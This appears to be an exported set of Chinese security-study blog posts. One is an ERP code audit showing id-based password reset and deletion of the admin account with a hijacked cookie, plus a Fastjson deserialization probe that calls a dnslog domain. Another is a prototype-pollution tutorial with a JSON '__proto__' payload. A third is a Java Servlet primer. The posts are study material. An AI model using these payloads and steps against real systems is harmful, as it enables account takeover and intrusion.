&#125;&#125;\n\n于是请求也有了，直接修改密码\n\n\n这样就可以通过id修改登录账号以外的密码了\n这个漏洞的主要触发原因我感觉在于仅仅通过id就能进行验证去修改密码，如果是用户自己修改或者管理员修改密码的话应该和登录的用户信息与id进行校验，应该使用某些密匙加密如jwt等手段进行加密，不然通过伪造请求头能够实现一些比如修改密码和用户名，任意重置密码等未启用的功能，配合之前的白名单越权漏洞可以直接不用登录就实现密码修改\n还有就是一个未实装的功能删除用户也可以使用这个方法实现删除用户，我们先来看代码\n@PostMapping(&quot;/deleteUser&quot;)@ResponseBodypublic Object deleteUser(@RequestParam(&quot;ids&quot;) String ids)throws Exception&#123;    JSONObject result = ExceptionConstants.standardSuccess();    userService.batDeleteUser(ids);    return result;&#125;\n\nservice层代码\n@Transactional(value = &quot;transactionManager&quot;, rollbackFor = Exception.class)public void batDeleteUser(String ids) throws Exception&#123;    StringBuffer sb = new StringBuffer();    sb.append(BusinessConstants.LOG_OPERATION_TYPE_DELETE);    List&lt;User&gt; list = getUserListByIds(ids);    for(User user: list)&#123;        sb.append(&quot;[&quot;).append(user.getLoginName()).append(&quot;]&quot;);    &#125;    logService.insertLog(&quot;用户&quot;, sb.toString(),            ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest());    String idsArray[]=ids.split(&quot;,&quot;);    int result =0;    try&#123;        result=userMapperEx.batDeleteOrUpdateUser(idsArray,BusinessConstants.USER_STATUS_DELETE);    &#125;catch(Exception e)&#123;        JshException.writeFail(logger, e);    &#125;    if(result&lt;1)&#123;        logger.error(&quot;异常码[&#123;&#125;],异常提示[&#123;&#125;],参数,ids:[&#123;&#125;]&quot;,                ExceptionConstants.USER_DELETE_FAILED_CODE,ExceptionConstants.USER_DELETE_FAILED_MSG,ids);        throw new BusinessRunTimeException(ExceptionConstants.USER_DELETE_FAILED_CODE,                ExceptionConstants.USER_DELETE_FAILED_MSG);    &#125;&#125;\n\n破案了，我的项目好像很多功能不像其他大佬的一样实装了功能，我的这里根本就没有删除按键，我只能像刚才一样访问前端文件才能获取到请求头\n又破案了，原来这个图标就是删除键，我竟然没看到\n\n\n而且使用管理员和jsh有按钮删除普通用户，由于这个判断很有可能是用过js代码判断用户名实现前端按键是否显示，后端没有做校验就进行删除，好像甚至没有对删除用户进行判定。也就是说我们可以劫持admin用户的Session，我们就可以实现 任意用户删除用户\n先获取admin用户的cookie\n\n\n然后再登录普通账号进行抓包修改id和cookie即可使用普通账号删除管理员账号\n\n\n这个删除并不是直接在数据库中删除信息，而是将其statue字段改为1表示停用，后面的逻辑我就不看了，放个sql语句吧\n Time：0 ms - ID：com.jsh.erp.datasource.mappers.UserMapperEx.batDeleteOrUpdateUserExecute SQL：UPDATE jsh_user SET status = 1 WHERE id IN (&#x27;132&#x27;)\n\n\n\n6.Fastjson反序列化漏洞之前做java sec code靶场的时候就出现过这个漏洞，这个和普通java反序列化漏洞不同的是这个是反序列化json数据，通过json数据像普通序列化一样对TemplatesImpl等类的属性进行赋值然后就弹计算器。\n&lt;dependency&gt;\t&lt;groupId&gt;com.alibaba&lt;/groupId&gt;\t&lt;artifactId&gt;fastjson&lt;/artifactId&gt;\t&lt;version&gt;1.2.55&lt;/version&gt;&lt;/dependency&gt;\n\nfastjson版本为1.2.55，属于有漏洞的版本，我们直接去找反序列化方法parseObject\n我们随便找一个路由，还需要参数可以控制，但是我不是特别想从头开始找路由触发方法的链，只能借鉴大佬的了，最后是StringUtil.java，入口的路由为/person/list\n\n\n根据链子，我们只需要将json数据传递到search即可触发反序列化\n我就不弹计算器了，使用dns试下\n&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;mgnrbw.dnslog.cn&quot;&#125;\n\n我们先抓到/person/list这个路由的包，主要是怕缺少session等东西\n\n\n最后成功拿到dns\n\n"},{"title":"原型链污染","url":"/2025/09/11/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","content":"原型链污染之前一直都没看过js的面向对象代码，实在是太难看了。但是没办法，搞不好就考到了。\njs中没有像php和java一样的反序列化漏洞，但是原型链污染和反序列化有点像。原理都是通过改变对象的属性实现攻击\n 原型链污染（Prototype Pollution）是指攻击者通过操控对象的原型链，修改或注入不应存在的属性。这样，所有继承自该原型的对象都会受到影响，可能导致程序行为异常、数据泄露或系统漏洞。\n1.prototype和protoJavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义：\nfunction Foo() &#123;    this.bar = 1&#125;new Foo()\n\nFoo函数的内容，就是Foo类的构造函数，而this.bar就是Foo类的一个属性。\n原来这就是js的类，之前都给我看懵逼了\n一个类必然有一些方法，类似属性this.bar，我们也可以将方法定义在构造函数内部：\nfunction Foo() &#123;    this.bar = 1    this.show = function() &#123;        console.log(this.bar)    &#125;&#125;(new Foo()).show()\n\n但这样写有一个问题，就是每当我们新建一个Foo对象时，this.show = function...就会执行一次，这个show方法实际上是绑定在对象上的，而不是绑定在“类”中。\n我希望在创建类的时候只创建一次show方法，这时候就则需要使用原型（prototype）了：\nfunction Foo() &#123;    this.bar = 1&#125;//js中不止这种创建对象的方法Foo.prototype.show = function show() &#123;    console.log(this.bar)&#125;let foo = new Foo()foo.show()\n\n我们可以认为原型prototype是类Foo的一个属性，而所有用Foo类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的foo对象，其天生就具有foo.show()方法。\n感觉就是js中的每个类都是一开始会有同样的原型，然后如果直接在Foo中写方法的话，在每次实例化时会重新加载一次。然后prototype的作用就是访问原型，然后往Foo的原型中写方法然后再次实例化的时候就可以只用创建一次方法了\n我们可以通过Foo.prototype来访问Foo类的原型，但Foo实例化出来的对象，是不能通过prototype访问原型的。这时候，就该__proto__登场了。\n一个Foo类实例化出来的foo对象，可以通过foo.__proto__属性来访问Foo类的原型，也就是说：\nfoo.__proto__ == Foo.prototype\n\n\n\n所以，总结一下：\n\nprototype是一个类的属性，所有类对象在实例化的时候将会拥有prototype中的属性和方法\n一个对象的__proto__属性，指向这个对象所在的类的prototype属性\n\n2.JavaScript原型链继承所有类对象在实例化的时候将会拥有prototype中的属性和方法，这个特性被用来实现JavaScript中的继承机制。\nfunction Father() &#123;    this.first_name = &#x27;Donald&#x27;    this.last_name = &#x27;Trump&#x27;&#125;function Son() &#123;    this.first_name = &#x27;Melania&#x27;&#125;Son.prototype = new Father()let son = new Son()console.log(`Name: $&#123;son.first_name&#125; $&#123;son.last_name&#125;`)\n\n通过修改原型来实现继承\nSon类继承了Father类的last_name属性，最后输出的是Name: Melania Trump。\n总结一下，对于对象son，在调用son.last_name的时候，实际上JavaScript引擎会进行如下操作：\n\n在对象son中寻找last_name\n如果找不到，则在son.__proto__中寻找last_name\n如果仍然找不到，则继续在son.__proto__.__proto__中寻找last_name\n依次寻找，直到找到null结束。比如，Object.prototype的__proto__就是null\n\n\n\n\n\nJavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。\n以上就是最基础的JavaScript面向对象编程，我们并不深入研究更细节的内容，只要牢记以下几点即可：\n\n每个构造函数(constructor)都有一个原型对象(prototype)\n对象的__proto__属性，指向类的原型对象prototype\nJavaScript使用prototype链实现继承机制\n\n3.原型链污染第一章中说到，foo.__proto__指向的是Foo类的prototype。那么，如果我们修改了foo.__proto__中的值，是不是就可以修改Foo类呢？\n做个简单的实验：\n// foo是一个简单的JavaScript对象let foo = &#123;bar: 1&#125;//没想到js这么容易就可以创建一个对象// foo.bar 此时为1console.log(foo.bar)// 修改foo的原型（即Object）foo.__proto__.bar = 2// 由于查找顺序的原因，foo.bar仍然是1console.log(foo.bar)// 此时再用Object创建一个空的zoo对象let zoo = &#123;&#125;// 查看zoo.barconsole.log(zoo.bar)\n\n最后，虽然zoo是一个空对象&#123;&#125;，但zoo.bar的结果居然是2：\n\n\n原因也显而易见：因为前面我们修改了foo的原型foo.__proto__.bar = 2，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。\n后来，我们又用Object类创建了一个zoo对象let zoo = &#123;&#125;，zoo对象自然也有一个bar属性了。\n那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。\n也就是说我们在对一个类进行赋值的时候按理来说是无法攻击到其他类的，但是如果我们对这个类的__proto__进行赋值，即可追溯到Object类然后对其进行写入，导致其他链被污染\n4.如何使用原型链污染虽然我们可以通过类的__proto__属性进行原型链污染，但是我们js中可没有像unserialize那样直接反序列化然后进行赋值的操作\n我们思考一下，哪些情况下我们可以设置__proto__的值呢？其实找找能够控制数组（对象）的“键名”的操作即可：\n\n对象merge\n对象clone（其实内核就是将待操作的对象merge到一个空对象中）\n\n以对象merge为例，我们想象一个简单的merge函数：\nfunction merge(target, source) &#123;    for (let key in source) &#123;        if (key in source &amp;&amp; key in target) &#123;            merge(target[key], source[key])        &#125; else &#123;            target[key] = source[key]        &#125;    &#125;&#125;\n\n可以看到这是一个检查键值然后合并两个数组的函数，其中对不同的键值进行了一个赋值\n如果我们的代码如下\nlet o1 = &#123;&#125;let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;merge(o1, o2)console.log(o1.a, o1.b)o3 = &#123;&#125;console.log(o3.b)\n\n我们在o2对象中放了一个__proto__作为键，于是便会触发\no1[&#x27;__proto__&#x27;]=o2[&#x27;__proto__&#x27;] //也就是&#123;b: 2&#125;\n\n看似会对o1进行赋值，然后污染其原型，但是实际上失败了，虽然成功合并了但是没被污染成功\n\n\n这是因为，我们用JavaScript创建o2的过程（let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;）中，__proto__已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是[a, b]，__proto__并不是一个key，自然也不会修改Object的原型。\n也就是说__proto__无法被认为是一个键名而是在一开始加载对象进行赋值的时候会出现\no2.__proto__=&#123;b: 2&#125;\n\n就导致o2的原型变为了&#123;b: 2&#125;而不是让proto作为键值存在\n那么，如何让__proto__被认为是一个键名呢？\n我们将代码改成如下：\nlet o1 = &#123;&#125;let o2 = JSON.parse(&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;)merge(o1, o2)console.log(o1.a, o1.b)o3 = &#123;&#125;console.log(o3.b)\n\n通过JSON.parse将我们的json转化为对象，jsondecode是不能返回对象的，就会将__proto__作为键值\n\n\n可见，新建的o3对象，也存在b属性，说明Object已经被污染\n这是因为，JSON解析的情况下，__proto__会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。\nmerge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。\n","tags":["js原型链污染"]},{"title":"原生Java_web","url":"/2025/10/26/%E5%8E%9F%E7%94%9FJava-web/","content":"原生Java_web虽然目前我是在学网安，但是去看那些反序列化漏洞和各种框架CVE总感觉可以看懂逻辑却完全不了解Java，我感觉Java还是很难的，php在web层面至少比Java好理解一点，现在我面对Java那些各种框架是完全看不懂的，反正CTF那些简单的比赛Java考的少，就从基础的东西来\n1.简介原生 Java Web 指的是：\n不依赖任何框架（如 Spring、Struts、SpringMVC），直接使用 Java EE 提供的标准 Web 技术（Servlet、JSP、Filter、Listener 等）构建 Web 应用。\n\n也就是说，它是 最原始、最基础的 Web 开发方式， 一切功能都需要你自己写，没有自动注入、没有框架封装。\n2.核心组成原生 Java Web 基于 Servlet 规范，运行在 Web 容器（如 Tomcat） 上。\n核心组件包括：\n\n\n\n组件\n作用\n示例\n\n\n\nServlet\n控制层：处理 HTTP 请求与响应\n登录、注册、接口处理逻辑\n\n\nJSP\n视图层：生成动态页面（类似 HTML 模板）\n展示用户信息、留言列表\n\n\nFilter\n过滤器：拦截请求&#x2F;响应，进行预处理\n登录验证、日志、跨域处理\n\n\nListener\n监听器：监听应用、会话、请求事件\n用户在线统计、资源释放\n\n\nweb.xml\n部署描述符：配置 Servlet、Filter、Listener\n类似于「路由表 + 注册表」\n\n\n执行顺序为\n客户端 → Container 解析请求 → Filter 链（按配置顺序）→ Servlet（或 JSP 编译后的 Servlet）→ 输出 → Filter 返回链上（过滤器可在前后处理）→ 请求结束，触发 Listener 回调。\n标准项目结构\n一个典型的原生 Java Web 项目结构如下：\nMyWebApp/ ├── src/ │   └── com/example/web/ │       ├── HelloServlet.java │       └── LoginServlet.java ├── WebContent/ │   ├── index.jsp │   ├── login.jsp │   └── WEB-INF/ │       ├── web.xml │       └── lib/   ← 存放 jar 包 └── build.xml / pom.xml（可选，取决于是否用 Maven）\n\n\n\n1.web.xml它主要用于：\n\n配置 Web 应用的结构与行为（比如首页、错误页、编码等）；\n注册组件（如 Servlet、Filter、Listener）；\n定义 URL 映射关系；\n进行安全控制。\n\n简单说，web.xml 是整个 Java Web 应用的“总控制中心”。\n基本结构\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee         http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot;         version=&quot;3.1&quot;&gt;    &lt;!-- 这里是各种配置内容 --&gt;&lt;/web-app&gt;\n\n\n\n常见配置\n\n\n\n分类\n标签\n作用\n\n\n\nServlet相关\n&lt;servlet&gt; &#x2F; &lt;servlet-mapping&gt;\n注册 Servlet 与访问路径\n\n\nFilter相关\n&lt;filter&gt; &#x2F; &lt;filter-mapping&gt;\n注册过滤器\n\n\nListener相关\n&lt;listener&gt;\n注册监听器\n\n\n全局设置\n&lt;context-param&gt;\n设置全局参数\n\n\n编码与欢迎页\n&lt;welcome-file-list&gt;\n指定默认首页\n\n\n错误处理\n&lt;error-page&gt;\n统一异常跳转页\n\n\n安全设置\n&lt;security-constraint&gt;\n限制 URL 访问权限\n\n\nSession配置\n&lt;session-config&gt;\n配置超时时间\n\n\nMIME类型\n&lt;mime-mapping&gt;\n定义文件类型映射\n\n\n一个完整的web.xml\n&lt;web-app&gt;    &lt;display-name&gt;MyWebApp&lt;/display-name&gt;    &lt;!-- 全局参数 --&gt;    &lt;context-param&gt;        &lt;param-name&gt;charset&lt;/param-name&gt;        &lt;param-value&gt;UTF-8&lt;/param-value&gt;    &lt;/context-param&gt;    &lt;!-- 过滤器 --&gt;    &lt;filter&gt;        &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt;        &lt;filter-class&gt;com.example.filter.EncodingFilter&lt;/filter-class&gt;    &lt;/filter&gt;    &lt;filter-mapping&gt;        &lt;filter-name&gt;encodingFilter&lt;/filter-name&gt;        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;    &lt;/filter-mapping&gt;    &lt;!-- Servlet --&gt;    &lt;servlet&gt;        &lt;servlet-name&gt;hello&lt;/servlet-name&gt;        &lt;servlet-class&gt;com.example.servlet.HelloServlet&lt;/servlet-class&gt;    &lt;/servlet&gt;    &lt;servlet-mapping&gt;        &lt;servlet-name&gt;hello&lt;/servlet-name&gt;        &lt;url-pattern&gt;/hello&lt;/url-pattern&gt;    &lt;/servlet-mapping&gt;    &lt;!-- 欢迎页 --&gt;    &lt;welcome-file-list&gt;        &lt;welcome-file&gt;index.jsp&lt;/welcome-file&gt;    &lt;/welcome-file-list&gt;    &lt;!-- 错误页 --&gt;    &lt;error-page&gt;        &lt;error-code&gt;404&lt;/error-code&gt;        &lt;location&gt;/error/404.html&lt;/location&gt;    &lt;/error-page&gt;&lt;/web-app&gt;\n\n\n\n在早期的 Servlet 规范（Servlet 2.x &#x2F; 2.5）中，确实所有组件都 必须在 web.xml 中配置，否则：\n\nServlet → 不会被容器识别，也无法访问 URL\nFilter → 不会被请求链调用\nListener → 生命周期事件无法触发\n\n从 Servlet 3.0（Java EE 6，2010 年左右）开始，Java Web 引入了 注解方式注册组件，大大减少了对 web.xml 的依赖：\n@WebServlet(&quot;/hello&quot;)public class HelloServlet extends HttpServlet &#123; &#125;@WebFilter(&quot;/*&quot;)public class EncodingFilter implements Filter &#123; &#125;@WebListenerpublic class StartupListener implements ServletContextListener &#123; &#125;\n\n在3.0版本以后就可以通过注解配置不需要在web.xml中配置了\n然后很烦的事情就是在IDEA中原生Java Web项目是不会自动生成项目结构的，所有配置文件都需要我们自己去创建，也就是说那些之前我跟着大佬创建的项目结构在原生Java Web中都是不固定的，这让我想起来了PHP\n于是我们的要求就变成了项目结构打包送到Tomcat后不会报错就行了\n于是我们需要了解Java Web项目的基本项目结构\n我们先需要知道在Java项目进行编译的时候第一层目录都是不会参与编译的，也就是第一层的src和WebContent，都是约定好的名字而已，都不会影响到Java项目的编译，pom.xml也就只是通过Maven来加载对应的外部库而已\n这一点可以从我们代码打包的时候不需要加上src路径，而是直接package com.example.web\n然后就是Java项目的Web根目录其实就是WEB-INF所在目录，然后其他jsp和html文件以及静态资源都不会改位置，可以直接通过URL访问到，WEB-INF是禁止通过URL访问的，等到编译的时候会将java文件全部编译为class文件，然后放入WEB-INF/classes/目录下\nMyWebApp/ ├── src/ │   └── com/example/web/ │       ├── HelloServlet.java │       └── LoginServlet.java ├── WebContent/ │   ├── index.jsp │   ├── login.jsp │   └── WEB-INF/ │       ├── web.xml │       └── lib/   ← 存放 jar 包 └── build.xml / pom.xml（可选，取决于是否用 Maven）\n\n也就是说Java Web项目中必须要有的是WEB-INF目录和其配置文件\nWEB-INF/          ← 私有目录必须有WEB-INF/web.xml   ← 对 Servlet 2.x 来说必须（3.x 可选）WEB-INF/classes/  ← 编译后的类文件WEB-INF/lib/      ← 如果有依赖 jar\n\n这些都是必须要有的\n2.ServletServlet是什么\nServlet（Server Applet），全称Java Servlet。是用Java编写的服务器端程序，其主要功能在于交互式地浏览和修改数据，生成动态Web内容。狭义的Servlet是指Java语言实现的一个接口，广义的Servlet是指任何实现了这个Servlet接口的类，一般情况下，人们将Servlet理解为后者。\n也就是这个用于接收请求然后动态返回Web内容\n\n\nServlet 执行以下主要任务：\n\n读取客户端（浏览器）发送的显式的数据。这包括网页上的 HTML 表单，或者也可以是来自 applet 或自定义的 HTTP 客户端程序的表单。\n读取客户端（浏览器）发送的隐式的 HTTP 请求数据。这包括 cookies、媒体类型和浏览器能理解的压缩格式等等。\n处理数据并生成结果。这个过程可能需要访问数据库，执行 RMI 或 CORBA 调用，调用 Web 服务，或者直接计算得出对应的响应。\n发送显式的数据（即文档）到客户端（浏览器）。该文档的格式可以是多种多样的，包括文本文件（HTML 或 XML）、二进制文件（GIF 图像）、Excel 等。\n发送隐式的 HTTP 响应到客户端（浏览器）。这包括告诉浏览器或其他客户端被返回的文档类型（例如 HTML），设置 cookies 和缓存参数，以及其他类似的任务。\n\n然后就是Servlet的生命周期差不多是从容器创建开始到容器销毁\n实现Servlet\n我们之前提到过，Servlet指的是一个接口，只有实现了这个接口的类才能被Web容器识别和调用。\n实际上实现Servlet有两种方法\n\n\n\n方式\n必须实现的内容\n备注\n\n\n\n① 直接实现 javax.servlet.Servlet 接口\n必须实现 5 个方法\n最底层方式\n\n\n② 继承 javax.servlet.http.HttpServlet\n只需重写 doGet() &#x2F; doPost() 等\n常用方式（推荐）\n\n\nServlet 接口（最低要求）\njavax.servlet.Servlet 接口定义了以下 5 个方法\npublic interface Servlet &#123;    void init(ServletConfig config) throws ServletException;    ServletConfig getServletConfig();    void service(ServletRequest req, ServletResponse res)            throws ServletException, IOException;    String getServletInfo();    void destroy();&#125;\n\n也就是说我们自己实现的Servlet需要实现这个接口然后必须实现这五个方法，Java中实现一个接口也必须要实现所有抽象方法不然会报错\npackage com.example.web;import javax.servlet.*;import java.io.IOException;import java.io.PrintWriter;public class HelloServlet implements Servlet &#123;    private ServletConfig config;    // 初始化方法，只执行一次    @Override    public void init(ServletConfig config) throws ServletException &#123;        this.config = config;        System.out.println(&quot;HelloServlet 初始化完成&quot;);    &#125;    // 获取配置信息    @Override    public ServletConfig getServletConfig() &#123;        return this.config;    &#125;    // 核心方法，每次请求都会调用    @Override    public void service(ServletRequest req, ServletResponse res)            throws ServletException, IOException &#123;        // 设置响应类型        res.setContentType(&quot;text/html;charset=UTF-8&quot;);        // 输出响应内容        PrintWriter out = res.getWriter();        out.println(&quot;&lt;html&gt;&lt;body&gt;&quot;);        out.println(&quot;&lt;h1&gt;Hello, this is a pure Servlet!&lt;/h1&gt;&quot;);        out.println(&quot;&lt;/body&gt;&lt;/html&gt;&quot;);    &#125;    // 返回一些Servlet信息（可选）    @Override    public String getServletInfo() &#123;        return &quot;HelloServlet v1.0 - written by Regulus&quot;;    &#125;    // 销毁方法，当服务器关闭或卸载时执行    @Override    public void destroy() &#123;        System.out.println(&quot;HelloServlet 已被销毁&quot;);    &#125;&#125;\n\n\n\n继承 HttpServlet（推荐写法）\nHttpServlet是一个实现了Servlet的类\nHttpServlet 已经实现了 Servlet 接口的大部分方法，并额外提供了针对 HTTP 协议的封装。\n于是我们只需要重写 doGet() &#x2F; doPost() 等\npublic void service(HttpServletRequest req, HttpServletResponse resp) &#123;    String method = req.getMethod();    if (&quot;GET&quot;.equals(method)) &#123;        doGet(req, resp);    &#125; else if (&quot;POST&quot;.equals(method)) &#123;        doPost(req, resp);    &#125;    ...&#125;\n\n也就是说你只需要 重写 doGet() &#x2F; doPost() 等方法，容器会自动帮你调用。\n实例\n@WebServlet(&quot;/hello&quot;)public class HelloServlet extends HttpServlet &#123;    protected void doGet(HttpServletRequest req, HttpServletResponse resp)            throws ServletException, IOException &#123;        resp.getWriter().println(&quot;Hello Servlet!&quot;);    &#125;&#125;\n\n\n\n\n\n容器（Tomcat、Jetty）负责：\n\n启动服务器；\n接收浏览器请求；\n把请求封装成 HttpServletRequest；\n把响应封装成 HttpServletResponse；\n调用你写的 Servlet 的 service() 方法。\n\n所以，Servlet 就是 Java Web 的最底层 API。\n然后我们在其他Web框架中看见各种注解进行路由注册的时候实际上都在后端调用方法去实现了Servlet\n比如Spring Boot中的GetMapping注解\n@RestControllerpublic class HelloController &#123;    @GetMapping(&quot;/hello&quot;)    public String sayHello() &#123;        return &quot;Hello Spring!&quot;;    &#125;&#125;\n\n\nSpring Boot 自动注册了一个 Servlet（通常叫 DispatcherServlet）；\n这个 Servlet 的 service() 方法接收到请求；\n它根据 URL（/hello）找到你定义的控制器方法；\n调用你的 sayHello()；\n把返回值写入响应中。\n\nDispatcherServlet 就是一个普通 Servlet，只不过它内部实现了“分发控制”逻辑。\n所有的 @RestController、@RequestMapping 都是让 Spring 去注册路由规则而已。\n我只是介绍了一下Servlet的一些概念用来看懂代码，如果要写代码的话还是做不到啊\n3.JSPJSP是什么\n一开始我还以为JSP指的是javascript，也是字母都对上了\nJSP（JavaServer Pages） 是一种由 Java EE（Jakarta EE）定义的 服务器端动态网页技术。\nJSP 是一种“嵌入 Java 代码的 HTML 页面”，由 Web 容器（Tomcat、Jetty 等）在运行时编译成 Servlet 来执行。JSP的主要功能是简化服务器端的Web开发，尤其是对于HTML、XML等页面内容的动态生成。\n也就是说JSP就是HTML和JAVA的结合版，可以作为HTML界面返回，JSP中还可以支持整个HTML语法\n至于为什么最后JSP文件都会被编译为Servlet然后再编译为class文件，那为什么不直接些Servlet呢\n\n与纯 Servlet 相比：JSP可以很方便的编写或者修改HTML网页而不用去面对大量的println语句。JSP更方便一点\n\n与JavaScript相比：虽然JavaScript可以在客户端动态生成HTML，但是很难与服务器交互，因此不能提供复杂的服务，比如访问数据库和图像处理等等。JSP最后要被编译为Java代码，功能肯定是比JS要强大的\n\n\n格式\n//指令&lt;%@ 指令名 属性=&quot;值&quot; %&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%@ page import=&quot;java.util.*&quot; %&gt;&lt;%@ include file=&quot;header.jsp&quot; %&gt;\n\n常用指令\n\n\n\n指令\n说明\n\n\n\npage\n设置页面属性（编码、导入类、异常页面等）\n\n\ninclude\n静态引入另一个 JSP&#x2F;HTML 文件\n\n\ntaglib\n引入 JSTL 或自定义标签库\n\n\n//表达式&lt;%= 表达式 %&gt;&lt;p&gt;当前时间：&lt;%= new java.util.Date() %&gt;&lt;/p&gt;\n\n功能：直接输出表达式结果到页面。\n// Java代码，可以嵌入任意Java代码&lt;% Java 代码 %&gt;&lt;%  for (int i = 1; i &lt;= 5; i++) &#123;%&gt;  &lt;p&gt;第 &lt;%= i %&gt; 行&lt;/p&gt;&lt;%  &#125;%&gt;\n\n这个写法好奇怪啊，一行就要包裹一次吗\n//声明&lt;%! Java 成员变量或方法 %&gt;&lt;%!  int counter = 0;  public int add(int a, int b) &#123; return a + b; &#125;%&gt;\n\n功能：定义在 JSP 对应 Servlet 类的成员变量或方法中。\n这个和直接写Java代码的区别在于生命周期和访问范围，声明的方法和变量可以在Servlet 存活期和整个Servlet被访问\n实例JSP，主要还是以HTML为主\n&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; %&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Login Page&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;h2&gt;Login&lt;/h2&gt;    &lt;form action=&quot;loginServlet&quot; method=&quot;post&quot;&gt;        Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;        Password: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;        &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;\n\n\n\n4.Filter 过滤器，顾名思义就是对事物进行过滤的，在Web中的过滤器，当然就是对请求进行过滤，我们使用过滤器，就可以对请求进行拦截，然后做相应的处理，实现许多特殊功能。如登录控制，权限管理，过滤敏感词汇等.\n 当我们使用过滤器时，过滤器会对游览器的请求进行过滤，过滤器可以动态的分为3个部分，1.放行之前的代码，2.放行，3.放行后的代码，这3个部分分别会发挥不同作用。\n\n第一部分代码会对游览器请求进行第一次过滤，然后继续执行\n第二部分代码就是将游览器请求放行，如果还有过滤器，那么就继续交给下一个过滤器\n第三部分代码就是对返回的Web资源再次进行过滤处理\n\n我们使用过滤器，也就是说，不止请求会经过过滤器，我们的响应也会经过过滤器。\n\n\nFilter过滤器的生命周期和Servlet是一致的\nFilter接口\n我们找到源码\n\n\n这个接口有三个方法，然后就只有doFilter是抽象方法，也就是说我们最低只需要实现doFilter这个抽象方法\n使用Filter\nFilter的设置方法和Servlet差不多，都是有注解和web.xml两种配置方法，在将web.xml的时候已经看过了\n创建Filter\n只需要实现doFilter方法即可\nimport javax.servlet.*;import java.io.IOException; public class MyFilter implements Filter &#123;     @Override    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;     &#125;&#125;\n\n然后就是Filter的配置了\nFilterConfig\nFilterConfig是由服务器(Tomcat)在创建和调用Filter对象时所传入的，只要是注册了的Filter都有一个其对应的FilterConfig，作为配置类，主要作用在于在初始化的时候用于获取初始化参数（init-param）、Filter 名称和应用上下文（ServletContext）。然后就是FilterConfig是Tomcat自动根据注册的Filter创建的，不需要我们自己配置\n我们可以看到init方法在初始化的时候FilterConfig作为参数传递了\n使用方法\n//获取Filter名称filterConfig.getFilterName();//获取一些配置时的初始化参数filterConfig.getInitParameter(&quot;参数名&quot;);//获取整个环境的Web上下文ServletContext context = filterConfig.getServletContext();\n\n这个初始化参数主要是Filter注册时的一些配置信息，比如\n&lt;filter&gt;    &lt;filter-name&gt;MyFilter&lt;/filter-name&gt;    &lt;filter-class&gt;com.example.MyFilter&lt;/filter-class&gt;    &lt;!-- 这里是初始化参数 --&gt;    &lt;init-param&gt;        &lt;param-name&gt;encoding&lt;/param-name&gt;        &lt;param-value&gt;UTF-8&lt;/param-value&gt;    &lt;/init-param&gt;    &lt;init-param&gt;        &lt;param-name&gt;exclude&lt;/param-name&gt;        &lt;param-value&gt;/login,/register&lt;/param-value&gt;    &lt;/init-param&gt;&lt;/filter&gt;\n\n\n\n实例代码\nimport javax.servlet.*;import javax.servlet.annotation.WebFilter;import javax.servlet.annotation.WebInitParam;import java.io.IOException;import java.util.ArrayList;import java.util.List; @WebFilter(servletNames = &#123;&quot;comment&quot;&#125;,initParams = &#123;@WebInitParam(name = &quot;sensitiveWord&quot;, value = &quot;zz&quot;)&#125;)public class CommentFilter implements Filter &#123;     private List&lt;String&gt; sensitiveWords = new ArrayList&lt;&gt;();    @Override    public void init(FilterConfig filterConfig) throws ServletException &#123;        //得到敏感词汇        String word = filterConfig.getInitParameter(&quot;sensitiveWord&quot;);        //加入集合        sensitiveWords.add(word);    &#125;     @Override    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;        //设置编码        servletRequest.setCharacterEncoding(&quot;utf-8&quot;);        servletResponse.setContentType(&quot;text/html;charset=utf-8&quot;);        //得到评论        String message = servletRequest.getParameter(&quot;message&quot;);        for (String sensitiveWord : sensitiveWords) &#123;            //对所有敏感词汇进行过滤            if (message.contains(sensitiveWord))&#123;                //替换敏感词汇                message = message.replace(sensitiveWord, &quot;**&quot;);            &#125;        &#125;        //存入request域        servletRequest.setAttribute(&quot;comment&quot;,message);        //放行        filterChain.doFilter(servletRequest,servletResponse);    &#125;     @Override    public void destroy() &#123;    &#125;&#125;\n\n这个过滤器就利用对请求进行优先处理的特性，将请求中的zz敏感词替换为**\nFilter的过滤顺序\nFilter的顺序主要取决于web.xml和注解的配置\n在web.xml中Filter 执行顺序由 &lt;filter-mapping&gt; 